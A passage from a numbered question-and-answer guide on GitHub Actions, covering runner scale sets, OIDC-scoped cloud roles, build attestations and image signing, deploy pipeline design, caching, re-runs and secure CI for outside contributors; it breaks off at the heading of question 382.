A **just-in-time (JIT) runner** is an ephemeral runner registered through the REST API (`generate-jitconfig`), which returns a one-time config for a single job. You don't need to handle long-lived registration tokens.

The benefit is the same as hosted runners: every job starts clean, so a malicious or broken job can't affect the next one. Autoscaling tools like Actions Runner Controller use this model.

## 324: How does Actions Runner Controller (ARC) work?

ARC is a Kubernetes operator maintained by GitHub that runs self-hosted runners as pods and scales them based on demand.

- You install the controller with Helm (`gha-runner-scale-set-controller`).
- You create one or more **runner scale sets** (`gha-runner-scale-set` chart), each with a name, min and max runners, the GitHub URL and credentials (preferably a GitHub App).
- The scale set listener keeps a connection to GitHub and is told how many jobs are waiting. The controller creates ephemeral runner pods for them and removes the pods after each job.
- Workflows target the scale set by its name: `runs-on: arc-linux-large`.

You can scale to zero when idle, and each job gets a fresh pod.

## 325: What are runner scale sets?

A runner scale set is a group of identical self-hosted runners that GitHub knows about as one unit. Instead of GitHub sending a job to a specific runner, it tells the scale set how many jobs are waiting, and the scale set creates ephemeral runners to match.

Scale sets are used by ARC on Kubernetes. GitHub also released a standalone runner scale set client (in public preview in 2026), a Go module that lets you build the same autoscaling on other platforms, like VMs in your own cloud, without Kubernetes.

## 326: How does container mode work in ARC?

Jobs with `container:` or `services:` need a container runtime, which a runner pod doesn't have by default. ARC offers two modes:

- **`dind` (Docker in Docker)**: a Docker daemon sidecar runs in the pod. Simple and compatible with most workflows, but it needs a privileged container, which is a security concern.
- **`kubernetes`**: the runner uses container hooks to create the job container and services as separate pods through the Kubernetes API. No privileged containers, but it needs a persistent volume for the workspace, and some Docker features (like `docker build` in a step) won't work without extra tools like Kaniko or BuildKit.

Pick based on whether your workflows build images, and how strict your cluster's security rules are.

## 327: How do you design runner access in a large organization?

- Create runner groups per trust level: for example "general CI" (all repos), "deploy-prod" (only the deploy repos and only certain workflows), and "GPU" (only ML repos).
- Use ephemeral runners everywhere, so jobs can't affect each other.
- Give network access to private systems only to runner groups that need it.
- Restrict groups to specific workflows (for example, only `my-org/deploy/.github/workflows/prod.yml@refs/heads/main`), so other workflows in the same repository can't use them.
- Use separate cloud accounts or clusters for production runners.
- Monitor the queue time and usage per group to size them correctly.

## 328: How do you keep self-hosted runners up to date?

By default the runner updates itself when a new version is released. If you build runner images yourself (for ARC or VM templates), you disable auto-update and must rebuild images regularly.

GitHub refuses jobs from runners that are too old. It enforces a minimum version, and in 2026 added an API endpoint that tells you when registration and run support end for a given runner version. New actions also require newer runners (for example, actions that use Node 24 need a recent runner).

Automate this: a scheduled pipeline that builds a new runner image when a runner release comes out, plus OS patches, then rolls it out.

## 329: How do you handle caching on self-hosted runners?

`actions/cache` works on self-hosted runners, but the cache is stored in GitHub's service, so restoring means downloading over the network every time. For big caches that can be slow.

Alternatives:

- Local disk caches on persistent runners (fast, but you lose isolation between jobs, and poisoning becomes easier).
- A shared cache next to the runners, like an S3 bucket with a cache action that supports it, or a remote cache server for your build tool (Gradle, Bazel, Turborepo, Nx).
- A pull-through proxy for package registries and container images inside your network.

With ephemeral runners, a remote cache in the same network is usually the best balance.

## 330: How do you customize the OIDC subject claim?

You can change the `sub` claim template for an organization or repository through the REST API, so it includes the fields you want to match in cloud trust policies.

```bash
gh api -X PUT repos/my-org/my-repo/actions/oidc/customization/sub \
  -F use_default=false \
  -f "include_claim_keys[]=repo" \
  -f "include_claim_keys[]=context" \
  -f "include_claim_keys[]=job_workflow_ref"
```

With `job_workflow_ref` in the subject, the cloud role can require that the token comes from one specific reusable workflow at a specific ref, like your central, reviewed deploy workflow, no matter which repository calls it.

## 331: How do you scope cloud permissions per environment with OIDC?

Create one cloud role per environment and match the `environment` part of the subject in each trust policy.

```json
{
  "Effect": "Allow",
  "Principal": {
    "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
  },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:my-org/shop:environment:production"
    }
  }
}
```

Combine this with environment protection rules (required reviewers, allowed branches). Then even someone who can push a branch and edit the workflow can't get production credentials, because the token only says `environment:production` after the environment's rules pass.

## 332: How does OIDC work with reusable workflows?

When a job runs inside a reusable workflow, its OIDC token contains both the caller's info (`repository`, `ref`, `workflow_ref`) and the called workflow's info (`job_workflow_ref`, `job_workflow_sha`).

That allows a powerful pattern: a platform team keeps one deploy workflow in a central repository, and cloud roles only trust tokens where `job_workflow_ref` is that workflow at a protected ref. Product teams call it, but they can't change how the deploy works or get the credentials outside of it.

The caller must grant `id-token: write` to the job that calls the reusable workflow.

## 333: What are artifact attestations?

An artifact attestation is a signed statement about how an artifact (binary, package, container image) was built: which repository, commit, workflow and runner produced it. It's in the SLSA provenance format and signed with Sigstore using the workflow's OIDC identity, so no signing keys are needed.

```yaml
permissions:
  id-token: write
  contents: read
  attestations: write

steps:
  - run: npm run build && tar -czf app.tar.gz dist
  - uses: actions/attest-build-provenance@v2
    with:
      subject-path: app.tar.gz
```

For container images, pass `subject-name` and `subject-digest` (and `push-to-registry: true`) instead of a file path.

## 334: How do you verify an attestation?

Use the GitHub CLI. It checks the signature and that the artifact was built by the expected repository or organization.

```bash
gh attestation verify app.tar.gz --repo my-org/my-app
gh attestation verify oci://ghcr.io/my-org/my-app:1.4.0 --owner my-org
```

You can also require a specific signer workflow with `--signer-workflow`. In Kubernetes, an admission controller (like the Sigstore policy controller) can check attestations before allowing an image to run, which closes the loop from build to deploy.

## 335: What SLSA level can you reach with GitHub Actions?

With artifact attestations on GitHub-hosted runners, you get SLSA v1.0 Build Level 2: the provenance is generated by the build platform and signed, so it can't be forged by editing a file.

To reach Build Level 3, the build must be isolated so the build steps can't tamper with the signing. The usual way is to build and attest in a reusable workflow that the calling repository can't modify, run on hosted (or ephemeral, isolated) runners, and verify `--signer-workflow` against that reusable workflow.

## 336: How do you generate an SBOM in a workflow?

Use a tool like Syft (through `anchore/sbom-action`) or the SBOM support in Docker Buildx, then store it as an artifact or attach it as an attestation.

```yaml
- uses: anchore/sbom-action@v0
  with:
    image: ghcr.io/my-org/my-app:${{ github.sha }}
    format: spdx-json
    output-file: sbom.spdx.json

- uses: actions/attest-sbom@v2
  with:
    subject-name: ghcr.io/my-org/my-app
    subject-digest: ${{ steps.build.outputs.digest }}
    sbom-path: sbom.spdx.json
    push-to-registry: true
```

With Buildx you can also add `sbom: true` and `provenance: mode=max` to `docker/build-push-action`, which attaches them to the image in the registry.

## 337: How do you sign container images with cosign in Actions?

Use keyless signing. Cosign gets a short-lived certificate from Sigstore using the workflow's OIDC token, so you don't manage any keys.

```yaml
permissions:
  contents: read
  packages: write
  id-token: write

steps:
  - uses: sigstore/cosign-installer@v3
  - id: build
    uses: docker/build-push-action@v6
    with:
      push: true
      tags: ghcr.io/my-org/api:${{ github.sha }}
  - run: cosign sign --yes "ghcr.io/my-org/api@${DIGEST}"
    env:
      DIGEST: ${{ steps.build.outputs.digest }}
```

Always sign the digest, not a tag, because tags can be moved. Verification checks the certificate identity, which is the workflow path and ref.

## 338: How do you scan container images and fail the build on serious vulnerabilities?

Build the image, scan it before pushing, and fail on the severity levels you choose.

```yaml
- uses: docker/build-push-action@v6
  with:
    load: true
    tags: api:scan
- run: |
    docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
      aquasec/trivy image --severity CRITICAL,HIGH --ignore-unfixed --exit-code 1 api:scan
```

In a real pipeline, pin the scanner image to a specific version or digest, since the scanner itself is part of your supply chain.

`ignore-unfixed` avoids failing on issues you can't fix yet. Keep an ignore file for accepted risks with expiry dates, and also scan on a schedule, because new vulnerabilities are found in images that already passed.

## 339: How do you reduce the risk of malicious install scripts in CI?

- Run `npm ci --ignore-scripts` (or set `ignore-scripts=true` in `.npmrc`) and run the build steps you need explicitly. pnpm doesn't run dependency install scripts by default unless you allow them.
- Keep install and test jobs free of secrets and with a read-only token.
- Review lock file changes in pull requests. A tool like dependency review helps.
- Use a minimum release age for new versions (supported by pnpm and Renovate), so freshly published, possibly malicious versions aren't picked up right away.
- Use a private registry proxy that can block known-bad packages.

## 340: How would you design a secure deploy pipeline end to end?

1. **Pull request**: `pull_request` trigger, read-only token, no secrets. Lint, test, build, scan.
2. **Merge to main**: rulesets require reviews and passing checks. CODEOWNERS covers `.github/`.
3. **Build**: one job builds the artifact or image once, pushes it by digest and creates a provenance attestation.
4. **Deploy staging**: a job using the `staging` environment gets cloud credentials through OIDC, deploys the digest and runs smoke tests.
5. **Deploy production**: `production` environment with required reviewers and branch rules. OIDC role trusts only `environment:production`. Deploys the same digest, verifies the attestation first.
6. **Hygiene**: actions pinned to SHAs, minimal `permissions` per job, `concurrency` for deploys, ephemeral runners, audit logs reviewed.

## 341: How would you design releases for a monorepo with many packages?

- Use a tool that understands the workspace, like Changesets, release-please (manifest mode) or Nx release, to decide which packages need new versions based on changes and dependencies between them.
- Keep a release pull request that collects version bumps and changelogs, so people review what will be released.
- When it's merged, a workflow publishes only the changed packages, in dependency order, with provenance.
- Tag each package separately (`api-v1.4.0`, `ui-v2.1.0`), and make deploy workflows filter tags by prefix.
- Run the publish job with `concurrency` so two releases don't race.

The hard parts are usually ordering of dependent packages and making a failed publish safe to re-run.

## 342: How do you build once and deploy the same artifact everywhere?

Build the artifact a single time, give it an immutable ID, and have every environment deploy that exact ID.

- For containers: push the image once and deploy by digest (`ghcr.io/acme/api@sha256:...`), not by a tag that may be rebuilt.
- For files: upload one artifact and download it in each deploy job, or publish it to a package registry with a unique version.
- Keep environment-specific settings out of the build. Read them at run time from environment variables or a config service.

```yaml
deploy-prod:
  needs: [build, deploy-staging]
  environment: production
  steps:
    - run: ./deploy.sh "ghcr.io/acme/api@${{ needs.build.outputs.digest }}"
```

This makes sure what you tested in staging is bit-for-bit what reaches production.

## 343: How do you handle database migrations in a deployment workflow?

- Run migrations as a separate step or job before the new app version is rolled out, using the same artifact or image.
- Make migrations backward compatible (expand and contract), so the old app version still works while the new one rolls out, and rollback of the app doesn't need a rollback of the schema.
- Use a job-level `concurrency` group so two migrations never run at the same time.
- Use the environment's credentials through OIDC, or a short-lived database token.
- Make the step safe to re-run: migration tools track what was applied, so a re-run after a failure continues where it stopped.

Destructive changes (dropping columns) go in a later release, after no running code uses them.

## 344: How do you roll back a deployment using GitHub Actions?

Common approaches:

- **Redeploy a previous version**: a `workflow_dispatch` workflow that takes a version or image digest as input and runs the normal deploy with it. Because you build once and keep artifacts, the old version is ready.
- **Re-run an old deploy run**: possible, but it re-runs the old workflow file and uses current secrets, which may have changed, so a dedicated rollback input is clearer.
- **Platform rollback**: `kubectl rollout undo`, switching a blue/green target back, or reverting in your GitOps repository.

Whatever you choose, test it regularly. A rollback path that's never used tends to break when you need it.

## 345: How do you implement a canary deployment with Actions?

GitHub Actions orchestrates the steps, while the platform (Kubernetes with a service mesh, a load balancer, or a tool like Argo Rollouts) does the traffic split.

```yaml
steps:
  - run: ./deploy.sh canary "$IMAGE" --weight 10
  - run: ./check-metrics.sh --error-rate-max 1 --duration 10m
  - run: ./deploy.sh canary "$IMAGE" --weight 50
  - run: ./check-metrics.sh --error-rate-max 1 --duration 10m
  - run: ./deploy.sh promote "$IMAGE"
  - if: failure()
    run: ./deploy.sh abort-canary
```

Keep long waits outside the runner when possible (a runner waiting 30 minutes costs money and can hit timeouts). Tools like Argo Rollouts or Flagger do analysis inside the cluster, and the workflow only starts the rollout and reports the result.

## 346: How do you deploy to many regions or clusters?

Use a matrix with `max-parallel` to control the pace, and per-target concurrency groups to avoid overlapping deploys.

```yaml
jobs:
  deploy:
    strategy:
      fail-fast: true
      max-parallel: 2
      matrix:
        region: [eu-west-1, us-east-1, ap-southeast-1]
    runs-on: ubuntu-latest
    environment: production-${{ matrix.region }}
    concurrency:
      group: deploy-${{ matrix.region }}
    steps:
      - run: ./deploy.sh "${{ matrix.region }}"
```

If you need strict waves (one canary region first, then the rest), use separate jobs with `needs` instead of one matrix, since matrix jobs don't run in a fixed order.

## 347: How do you avoid race conditions between deploys?

- Use a `concurrency` group per environment so only one deploy runs at a time.
- Make sure a slow, older run can't overwrite a newer deploy. Since the group only keeps the newest pending run, older pending runs are cancelled. But if the older run already started, the newer one waits behind it, which is fine.
- In the deploy step, check that the commit is still the latest on the branch, or that the version being deployed is newer than the running one, and skip if not.
- For GitOps, update the config repository with a compare-and-swap (fail and retry if someone else pushed first).

Re-runs of old deploy runs are a common source of accidental rollbacks, so protect against them too.

## 348: Why aren't concurrency groups a real queue, and what can you do about it?

A concurrency group keeps at most one running and one pending entry. When a third run arrives, the existing pending one is cancelled. For CI that's what you want, but for deploys it can mean a commit is never deployed on its own, only the latest one is.

That's usually fine if each deploy includes all earlier changes. If every run must happen (for example, each run applies a different migration or processes different data), options are:

- Use a merge queue so changes are batched before they reach `main`.
- Use a deploy tool with its own queue, and let the workflow only submit requests.
- Process work items from a real queue (database table, SQS) inside one long-running job.

## 349: How do you speed up CI for a large monorepo?

- Build only what changed, plus what depends on it, using the build tool's dependency graph (Nx `affected`, Turborepo filters, Bazel, Pants).
- Use a remote cache for task results, so unchanged packages don't rebuild or retest at all, even across branches and developers.
- Use sparse checkout or partial clone for huge repositories.
- Split big test suites into shards, and balance them by timing data.
- Keep a warm dependency cache built on `main`.
- Make one fast required check, and run slower suites in the merge queue or after merge.

Measure first. In many monorepos most time goes to install and setup, not tests.

## 350: How do you design cache keys to get more hits?

- Put the most stable parts first and the most changing parts last, so `restore-keys` prefixes can still match: `os-tool-lockhash-sourcehash`.
- Include everything that makes the content different: OS, architecture, tool version and lock file hash.
- Don't include things that change on every run (like `github.sha`) unless you rely on restore keys for partial hits.
- Make sure caches are created on the default branch, so all branches can restore them.
- Save the cache only from the job that produces the full content, not from every matrix entry, to avoid many near-duplicate entries pushing each other out.

Check the cache-hit rate in the logs (`cache-hit` output) after changes.

## 351: When can caching make a workflow slower?

- When restoring takes longer than recreating. A 3 GB cache that takes 90 seconds to download and unpack is worse than a 40 second `npm ci` from a nearby registry.
- When you cache folders that get rebuilt anyway, like `node_modules` with `npm ci`.
- When saving happens on every run because the key always changes, adding upload time to each job.
- When too many keys fill the repository limit, so useful entries are evicted and hit rates fall.
- When hashing huge file sets for the key takes noticeable time.

Look at the timing of the cache steps in the logs and compare runs with and without the cache before assuming it helps.

## 352: How do you deal with the repository cache size limit?

- See what takes the space: `gh cache list --sort size_in_bytes --order desc`.
- Save caches only from `main` and only restore on pull requests, so feature branches don't create many entries.
- Avoid one cache per matrix entry if the content is the same; use one shared key.
- Don't cache things that are cheap to recreate, or that are huge, like Docker layers with `mode=max` for many images. Use a registry cache for those.
- Delete stale caches after branch deletions or big dependency changes.
- If the cache is still too small, the limit can be raised with paid storage, or you can move big caches to your own storage (S3, a remote build cache).

## 353: How do you make checkout fast for a very large repository?

```yaml
- uses: actions/checkout@v6
  with:
    fetch-depth: 1 # only the current commit (default)
    filter: blob:none # partial clone, file contents fetched on demand
    sparse-checkout: |
      apps/api
      packages/shared
    sparse-checkout-cone-mode: true
    lfs: false
```

- Keep `fetch-depth: 1` unless you need history. If you need history but not file contents, combine `fetch-depth: 0` with `filter: blob:none`.
- Use sparse checkout so only the folders the job needs are written to disk.
- Skip Git LFS files unless the job needs them, and fetch them selectively with `git lfs pull --include`.
- On persistent self-hosted runners, keep a reference clone and update it instead of cloning from scratch.

## 354: How do you speed up Docker image builds in CI?

- Order the Dockerfile so rarely changing layers (base image, system packages, dependency install) come before often changing ones (source code).
- Use BuildKit cache mounts for package managers: `RUN --mount=type=cache,target=/root/.npm npm ci`.
- Use a persistent layer cache: `cache-from`/`cache-to` with `type=gha` or `type=registry`.
- Use `mode=max` for multi-stage builds, so intermediate stages are cached too.
- Keep the build context small with a good `.dockerignore`.
- Build different platforms on native runners instead of under QEMU.
- Build several images in parallel with Buildx Bake if they share stages.

## 355: How do you measure CI performance over time?

- Use the Actions usage and performance metrics in the organization's Insights, which show minutes, job run times, queue times and failure rates per workflow and repository.
- Export run and job data from the REST API (`/actions/runs`, `/actions/runs/{id}/jobs`), which include start and end times for each job and step, into a dashboard.
- Use `workflow_run` or webhook events to push timings into your observability tool. There are community exporters that turn workflow runs into OpenTelemetry traces.
- Track percentiles (p50, p90) of "time from push to green", not only averages, plus queue time and flaky failure rate.

What you measure shapes what improves, so pick the numbers developers actually feel.

## 356: How do you reduce the time jobs wait in the queue?

- Check if you hit the account's concurrent job limit. Cancel outdated runs and avoid needless matrix entries to free up slots.
- For larger runners, raise the max concurrency setting of the runner pool.
- For self-hosted autoscaling, keep a few warm runners (`minRunners` in ARC) during work hours, and make sure scale-up isn't limited by node capacity or slow image pulls.
- Use smaller runner images and cache the runner image on nodes.
- Split runners by label or group so long jobs don't block short ones.
- Avoid macOS for jobs that don't need it, because macOS has lower concurrency limits.

## 357: How do you work within the 256 jobs per matrix limit?

- Question whether you need every combination. Often you can test all versions on one OS, and only the newest version on the other OSes, using `include` instead of a full cross product.
- Group several small items per job, like testing 10 packages per job instead of 1.
- Split the matrix across several jobs (each with its own matrix up to 256), for example by grouping by OS.
- For truly huge fan-out, generate a list in a planning job and use reusable workflows or batches.

Also remember the concurrency limit: a 200-job matrix won't run all at once anyway, so very wide matrices often aren't faster than smaller ones that each do more.

## 358: What do you do when a job needs more than 6 hours?

GitHub-hosted runners stop jobs at 6 hours. Options:

- Split the work into several jobs, maybe in a matrix, and pass state between them with artifacts.
- Make the work resumable: save progress as an artifact or cache, and have the next job (or the next scheduled run) pick up where it stopped.
- Speed it up with larger runners.
- Move it to a self-hosted runner, which allows jobs up to 5 days.
- Move it out of CI entirely to a batch system (Kubernetes jobs, AWS Batch), and let the workflow only start it and check the result.

Very long CI jobs are often a sign that the work belongs in a different system.

## 359: What API rate limits matter in workflows?

`GITHUB_TOKEN` can make 1,000 REST API requests per hour per repository (higher for GitHub Enterprise Cloud). GitHub App installation tokens have their own limits that grow with the number of repositories and users. Unauthenticated requests (for example, an action downloading from the API without a token) have a very low limit per IP, which hosted runners share with other users.

Ways to stay under the limits:

- Always authenticate API calls, even for public data.
- Use GraphQL to get many things in one request.
- Avoid polling in loops. Use events or longer intervals.
- Use `gh api --paginate` carefully on large lists.
- Read the `x-ratelimit-remaining` header and back off.

Secondary rate limits also apply, for example on creating many issues or comments quickly.

## 360: How would you design a shared library of reusable workflows for an organization?

- Put them in one repository (like `my-org/workflows`) with clear names: `node-ci.yml`, `docker-build.yml`, `deploy-k8s.yml`.
- Keep inputs few and well documented, with sensible defaults. Don't expose every option.
- Use explicit `secrets` instead of `secrets: inherit` for workflows that need sensitive values.
- Release with semantic version tags. Consumers pin a major tag or SHA and update through Dependabot.
- Test every change with a test workflow that calls the reusable workflows against sample projects.
- Write a changelog, and announce breaking changes before the next major.
- Make the platform team code owners of the repository.

## 361: How do you roll out a change to a shared workflow safely?

1. Make the change on a branch and test it by calling it with `@branch-name` from a test repository.
2. Release it as a new version tag.
3. Roll it out to a few pilot repositories first by bumping their pinned version.
4. Watch their runs for failures and timing changes.
5. Move the major tag (for non-breaking changes) or release a new major (for breaking changes), and let Dependabot open update pull requests for the rest.

Avoid having all repositories call the shared workflow at `@main`. One bad commit then breaks every pipeline in the organization at once.

## 362: What are the common pitfalls of composite actions?

- Every `run` step needs `shell`, or the action fails to load.
- The `secrets` context isn't available. Secrets must be passed in as inputs.
- Outputs must be mapped explicitly in `action.yml` with `value`.
- `env` and `GITHUB_ENV` changes made inside the composite action leak out to the caller's later steps, which can surprise people.
- Relative paths in `run` steps refer to the caller's workspace, not the action's folder. Use `${{ github.action_path }}` to reach the action's own files.
- No `pre` or `post` steps, so cleanup must be done differently.
- Logs show the action as one step, which can make failures harder to find.

```yaml
- run: ${{ github.action_path }}/scripts/setup.sh
  shell: bash
```

## 363: Why do JavaScript actions commit a bundled dist folder?

The runner doesn't install npm packages for actions. It downloads the repository at the given ref and runs the file in `runs.main` directly with Node.js. So everything the action needs must already be in the repository.

Bundling with a tool like `@vercel/ncc` or Rollup puts the code and all dependencies into one file (`dist/index.js`), which is small and fast to download. Committing `node_modules` instead works but is huge and messy.

Since `dist/` is generated, add a CI check that rebuilds it and fails if it differs from the committed version, so the shipped code always matches the source you reviewed.

## 364: How does a Docker action receive its inputs?

Each input is passed as an environment variable named `INPUT_<NAME>`, with the name in uppercase and spaces replaced by underscores. You can also pass inputs as container arguments with `args` in `action.yml`.

```yaml
inputs:
  target-dir:
    default: docs
runs:
  using: docker
  image: Dockerfile
  args: ["--verbose"]
```

```bash
#!/bin/sh
echo "Checking $INPUT_TARGET-DIR"       # wrong, shell variables can't contain '-'
printenv 'INPUT_TARGET-DIR'             # works
```

Because hyphens in variable names are hard to read in shell, many action authors use underscores in input names. The runner also mounts the workspace at `/github/workspace` and passes the usual `GITHUB_*` variables, so file paths should be relative to that.

## 365: What are the trade-offs between JavaScript, Docker and composite actions?

|                | JavaScript               | Docker                     | Composite                |
| -------------- | ------------------------ | -------------------------- | ------------------------ |
| Start time     | fast                     | slow (build or pull image) | fast                     |
| OS support     | Linux, Windows, macOS    | Linux only                 | depends on the steps     |
| Language       | JS/TS                    | any                        | shell plus other actions |
| Dependencies   | must be bundled          | in the image               | must be on the runner    |
| Pre/post hooks | yes                      | yes                        | no                       |
| Maintenance    | Node.js runtime upgrades | image updates              | lowest                   |

Choose composite for glue logic, JavaScript for logic that calls APIs or needs cross-platform support, and Docker when you need a specific toolchain that's hard to install on the runner.

## 366: How do you share state between the pre, main and post parts of a JavaScript action?

Use `core.saveState` and `core.getState`. Values are stored as strings and are only visible to the same action instance.

```js
// main.js
import * as core from "@actions/core";
const tempDir = await createTempEnvironment();
core.saveState("tempDir", tempDir);

// post.js
import * as core from "@actions/core";
const tempDir = core.getState("tempDir");
if (tempDir) {
  await removeTempEnvironment(tempDir);
}
```

Under the hood, state is written to the `GITHUB_STATE` file and given back to the post step as `STATE_<name>` environment variables.

## 367: How do you make an action work on both GitHub.com and GitHub Enterprise Server?

- Don't hard-code `https://api.github.com` or `https://github.com`. Use `github.api_url`, `github.server_url` and `github.graphql_url` (or the `GITHUB_API_URL` and `GITHUB_SERVER_URL` variables). `@actions/github` does this for you.
- Check that the APIs and features you use exist in the GHES versions you support.
- Keep the runtime (`node20`, `node24`) in line with what the GHES runner versions support.
- GHES may have no internet access, so don't download tools from the internet at run time without a fallback.

GHES admins often sync actions from GitHub.com with `actions-sync` or GitHub Connect, so make your releases easy to mirror.

## 368: How does the Node.js runtime for JavaScript actions get upgraded?

An action declares its runtime in `action.yml` (`using: node20` or `using: node24`). The runner ships with those Node.js versions and runs the action with the one it asks for.

When a Node.js version reaches end of life, GitHub deprecates it on runners: first with warnings, then by forcing actions onto the newer version by default, and finally by removing the old one. In 2025 and 2026 GitHub moved from Node 20 to Node 24 this way, and Node 20 has now been removed from hosted runners. Action maintainers released new major versions with `using: node24`, which is why many official actions bumped their major versions, and why those need a recent runner version.

## 369: What happens if an action still declares an old Node.js runtime?

After the runtime is deprecated, the runner shows a warning and runs the action on the newer Node.js version instead. Most actions keep working, but some break because of changed Node.js APIs or native modules.

Once the old runtime is removed from the runner, it can't be used at all. On self-hosted runners, admins could sometimes opt out temporarily with an environment variable during the migration window, but that only buys time.

The fix is to update to a version of the action that declares the new runtime. If the action is unmaintained, fork it or replace it.

## 370: How do you avoid breakage from hosted runner image updates?

GitHub updates runner images every week or two, and moves `-latest` labels to new OS versions after an announcement.

- Use explicit labels like `ubuntu-24.04` instead of `ubuntu-latest` for important pipelines, and upgrade on purpose.
- Install tool versions explicitly with setup actions or a version manager, instead of using what's preinstalled.
- Use a job container with a pinned image digest if you need full control.
- Watch the `actions/runner-images` repository announcements for deprecations and upcoming label changes.
- When a build breaks suddenly, compare the image version in "Set up job" between the last good and first bad run.

## 371: How do you make builds reproducible in GitHub Actions?

- Pin action versions to SHAs.
- Pin runner OS versions (`ubuntu-24.04`) or use a pinned container image digest.
- Pin tool versions (`.nvmrc`, `.python-version`, `packageManager` in `package.json`, `go.mod`).
- Use lock files and strict installs (`npm ci`, `--frozen-lockfile`).
- Avoid downloading "latest" anything during the build.
- Set `SOURCE_DATE_EPOCH` and avoid timestamps in output when byte-identical builds matter.
- Record the build environment in provenance attestations.

Fully reproducible builds take effort, but even partial pinning removes most "it worked yesterday" failures.

## 372: How do you make workflows safe to re-run?

- Make every step idempotent: `create or update` instead of `create`, `mkdir -p`, `kubectl apply` instead of `create`, upserts in database scripts.
- Use unique names per attempt where needed (`${{ github.run_id }}-${{ github.run_attempt }}`), for example for artifacts or temporary resources.
- Check state before acting: skip publishing if the version already exists in the registry, skip tagging if the tag exists.
- Make deploys target a specific version, so a re-run deploys the same thing.
- Use concurrency groups so a re-run doesn't overlap with a newer run.

A good test: re-run the whole workflow after it succeeded. It should succeed again without side effects.

## 373: What does a re-run reuse from the original run, and what does it not?

**Reused:**

- The same commit SHA and ref.
- The same event payload (`github.event`).
- The same workflow file version, including reusable workflows (pinned to the SHA from the original run).
- The same `run_id` and `run_number`. `run_attempt` increases.

**Not reused:**

- Secrets and variables: the current values are used.
- `GITHUB_TOKEN`: a new one is created.
- Action tags: resolved again, so a moved tag can give different code.
- Cache: whatever exists now.
- Outputs of jobs that aren't re-run are reused from the earlier attempt when you re-run only failed jobs.

The actor for the re-run (`github.triggering_actor`) can be a different person than the original `github.actor`.

## 374: Why do outputs from matrix jobs get overwritten, and how do you collect them?

A job with a matrix still has one set of outputs. Each matrix job writes the same output names, and the last one to finish wins. So you can't reliably read the output of every matrix entry through `needs`.

To collect results from all matrix jobs, have each one upload a small artifact with a unique name, then merge them in a later job:

```yaml
# matrix job
- run: echo "{\"region\":\"${{ matrix.region }}\",\"url\":\"$URL\"}" > result.json
- uses: actions/upload-artifact@v6
  with:
    name: result-${{ matrix.region }}
    path: result.json

# collector job
- uses: actions/download-artifact@v7
  with:
    pattern: result-*
    merge-multiple: false
    path: results/
- run: jq -s '.' results/*/result.json
```

## 375: How do you write cleanup that runs even when a workflow is cancelled?

Use `if: always()` on the cleanup step or job. `!cancelled()` and `failure()` don't run on cancellation.

```yaml
steps:
  - run: ./create-test-env.sh "$RUN_ID"
  - run: npm run e2e
  - name: Destroy test environment
    if: always()
    run: ./destroy-test-env.sh "$RUN_ID"
env:
  RUN_ID: ${{ github.run_id }}-${{ github.run_attempt }}
```

Cleanup on cancellation isn't guaranteed: if the runner crashes or is force-stopped, the step never runs. For resources that cost money (cloud environments, preview databases), also add a scheduled job that removes anything older than a few hours, and tag resources with the run ID so they can be found.

## 376: What happens to running processes when a job is cancelled or times out?

The runner sends `SIGINT` to the process of the current step, waits about 7.5 seconds, then sends `SIGTERM`, waits about 2.5 seconds, and then kills it. On Windows the behavior is similar with console control events.

Then steps with `always()` (or `cancelled()`) run, and post steps of actions run. Finally, the runner kills any child processes left over from the job (unless they are explicitly allowed to stay).

If your step starts something that needs a graceful shutdown (like a database migration or a lock in an external system), handle `SIGINT`/`SIGTERM` in your script with a `trap` and keep the cleanup short.

## 377: How do you keep persistent self-hosted runners clean between jobs?

- The best option is not to need it: use ephemeral runners.
- If runners are persistent, clean the workspace at the start of each job (`actions/checkout` with `clean: true` is the default, but untracked build outputs outside the repo folder remain).
- Use the runner's job hooks (`ACTIONS_RUNNER_HOOK_JOB_STARTED` and `ACTIONS_RUNNER_HOOK_JOB_COMPLETED` scripts) to remove temp files, Docker containers, images and volumes, and to kill stray processes.
- Run jobs in containers, so most changes stay inside a throwaway container.
- Watch disk space and reboot or reimage runners regularly.

Leftover state causes flaky builds and is a security problem, because one job can tamper with the next.

## 378: How do you design CI for an open source project with outside contributors?

- Use `pull_request` for everything that runs contributor code. No secrets, read-only token.
- Keep "Require approval for first-time contributors" (or stricter) turned on, and look at the diff before approving, especially changes to workflows, scripts and `package.json`.
- Do privileged follow-ups (comments, coverage uploads, labels) with `workflow_run` or `pull_request_target` workflows that never run pull request code.
- Use GitHub-hosted runners only.
- Pin actions to SHAs and run `zizmor` or CodeQL on workflows.
- Keep publishing on tags or releases with OIDC trusted publishing and environment protection.

Avoid needing secrets in pull request CI at all. Use mocks and public test services instead.

## 379: What are the options for approving workflow runs from outside contributors?

In the repository or organization Actions settings, under "Approval for running fork pull request workflows from contributors":

- **Require approval for first-time contributors who are new to GitHub**: the most relaxed.
- **Require approval for first-time contributors** (the common default): anyone who hasn't had a commit merged needs approval.
- **Require approval for all external contributors**: anyone without write access needs approval every time.

Approval only allows the run to start; it doesn't grant secrets for `pull_request` runs from forks. The reviewer should still look at the changes, because a contributor who got one pull request merged is no longer "first-time" and can then run code without approval.

## 380: How can environments protect secrets in pull request workflows?

For workflows that run with secrets on pull request code (for example, integration tests against a real API), put the secrets on an environment with required reviewers, and use that environment only in the job that needs them.

```yaml
jobs:
  integration:
    runs-on: ubuntu-latest
    environment: pr-integration
    steps:
      - uses: actions/checkout@v6
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm run test:integration
        env:
          API_KEY: ${{ secrets.INTEGRATION_API_KEY }}
```

A maintainer must approve each run after reviewing the code. Keep these secrets low-value (a sandbox account), because a mistake in review means they leak.

## 381: Can someone with write access steal secrets by editing a workflow in a branch?

Yes. A `push` or `pull_request` workflow from a branch in the same repository runs the workflow file from that branch, with access to repository secrets. Anyone who can push a branch can write a workflow that prints or sends secrets.

Protections:

- Put sensitive secrets on environments with deployment branch rules (only `main`) and required reviewers. A branch workflow can't use that environment.
- Use OIDC roles that trust only `ref:refs/heads/main` or a protected environment.
- Limit who has write access, and use forks for outside collaborators.
- Monitor the audit log for unusual workflow changes on branches.

Repository-level secrets should be treated as readable by everyone with write access.

## 382: How do you protect the workflow files themselves?

